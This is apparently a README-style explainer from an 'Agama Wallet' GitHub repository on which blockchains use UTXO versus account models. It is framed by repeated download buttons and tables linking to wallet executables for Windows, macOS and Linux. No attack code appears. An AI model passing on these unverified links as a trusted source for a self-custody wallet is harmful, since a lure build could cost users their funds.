[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Which Blockchains Use the UTXO Model

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Bitcoin, Komodo, Litecoin, Dogecoin, Bitcoin Cash, Dash and Zcash use UTXO accounting, where coins are discrete outputs that are spent whole. Ethereum, Solana and most smart-contract chains use accounts, where a balance is stored and mutated. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and the assets it lists sit on both sides of that line.

## You'll see this if

You are moving an asset between two wallets and the behaviour changes: one asks for a fee that depends on how many payments you received, another charges a flat estimate.

| Chain | Model | What it means for you |
|---|---|---|
| Bitcoin (BTC) | UTXO | Fee depends on inputs; change outputs appear |
| Komodo (KMD) | UTXO | Same as Bitcoin, with asset chains alongside |
| Litecoin (LTC) | UTXO | Same pattern; widely used for swaps |
| Dogecoin (DOGE) | UTXO | Same pattern, high output counts common |
| Bitcoin Cash (BCH) | UTXO | Same pattern |
| Dash (DASH) | UTXO | Same pattern, with privacy features on top |
| Zcash (ZEC) | UTXO | Transparent outputs are UTXO; shielded ones differ |
| Cardano (ADA) | Extended UTXO | Outputs carry data and scripts |
| Ethereum (ETH) | Account | Balance plus nonce; no change outputs |
| Solana (SOL) | Account | Balances and accounts, not outputs |

The list is not exhaustive, and a chain can add features without changing its base model. The practical split is simple: if a wallet shows change and your fee moves with the number of payments you received, the chain is UTXO-based; if it shows one balance per address and a nonce or sequence number, it is account-based.

## Why it happens

The choice of model is a design decision made early and rarely revisited, because everything downstream depends on it: what a transaction contains, how fees are calculated, how wallets derive addresses, and what a smart contract can see.

UTXO chains optimise for simple, parallel validation: each transaction names the exact outputs it consumes, so two transactions touching different outputs cannot conflict. Account chains optimise for programmable state: a contract can read and write balances directly, which is awkward when value is scattered across outputs.

Cardano sits between the two. It keeps outputs but extends them with data and scripts, so a transaction can carry logic alongside value. [Cardano's extended UTXO model](https://github.com/agama-wallet/utxo/blob/main/cardano-extended-model.md) covers how that works. The base definition is in [what a UTXO is](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md), and the trade-offs in [UTXO vs the account model](https://github.com/agama-wallet/utxo/blob/main/outputs-versus-accounts.md).

## Fix

The practical work is matching expectations to the chain rather than fighting its model.

1. **Before sending, ask what the fee depends on.** On a UTXO chain it depends on transaction size; on an account chain, on the operation and network conditions.
2. **Expect change only on UTXO chains.** An account chain has nothing to return.
3. **Expect address reuse only on account chains.** A UTXO wallet will hand you fresh addresses.
4. **Check derivation when restoring across wallets.** The model determines how addresses are derived; the wrong defaults produce an empty-looking wallet.
5. **Check whether a token is native or issued.** An ERC-20 token lives in a contract on an account chain; a Komodo asset chain has its own UTXO chain behind it.

A wallet that supports both kinds, as Agama Wallet's asset list does, applies each chain's rules separately rather than one compromise.

## If that did not work

If a restored wallet shows nothing on a UTXO chain but the same recovery material works elsewhere, the difference is derivation, not the model. Address ranges and derivation defaults vary by wallet generation.

If a fee estimate on an account chain looks arbitrary, it is a market estimate of computation cost rather than a measurement of your transaction's size, and it can be replaced by a manual setting in most wallets.

If a swap between a UTXO chain and an account chain stalls, the reason is usually that the two legs settle on different schedules. The mechanism is explained in [how atomic swaps work](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md).

## Prevention

- **Learn one chain's model properly before assuming the next behaves the same.** Most wallet confusion comes from carrying habits across.
- **Keep the phrase, expect the addresses to differ.** Recovery material is portable; derivation is not automatic.
- **Do not compare fees across models.** The numbers measure different things.
- **Check what a "coin" actually is before moving it.** A native asset and an issued token behave differently under the same ticker.
- **Read the asset list a wallet publishes.** It tells you which chains, not which model, and the model follows the chain.

## FAQ

### Is Ethereum UTXO-based?

No. Ethereum uses accounts with balances and a nonce that orders transactions from each account. There are no outputs to select and no change to receive.

### Is Cardano a UTXO chain?

Yes, in an extended form: outputs exist as in Bitcoin, but each can carry data and a script, which is what allows smart contracts on a UTXO base.

### Why does Zcash behave differently from Bitcoin?

Zcash has transparent outputs that work like Bitcoin's and shielded outputs that hide amounts and addresses. A wallet's behaviour depends on which kind it is using at that moment.

### Why do some wallets support both models at once?

Because a wallet is a collection of per-chain implementations rather than one engine. A multi-asset wallet implements each chain's address format, transaction format and fee rules separately, so the model is a property of the chain, not of the wallet.

### Does a UTXO chain support smart contracts?

Some do, with extensions: Cardano attaches data and scripts to outputs, and other chains add similar mechanisms. The base model stays output-based, which limits how contracts read state compared with an account chain.

### Does the model affect which wallet can hold an asset?

Yes, indirectly: a wallet must implement the chain's address format and transaction rules. A wallet built for account chains cannot hold a UTXO asset without adding that chain's support.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is a UTXO? Unspent Transaction Outputs Explained](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md)
- [UTXO vs Account Model: How the Two Ledger Designs Differ](https://github.com/agama-wallet/utxo/blob/main/outputs-versus-accounts.md)
- [Cardano's Extended UTXO Model](https://github.com/agama-wallet/utxo/blob/main/cardano-extended-model.md)
- [KMD Coin: What Komodo's Native Asset Does](https://github.com/agama-wallet/agama-wallet/blob/main/what-kmd-does.md)
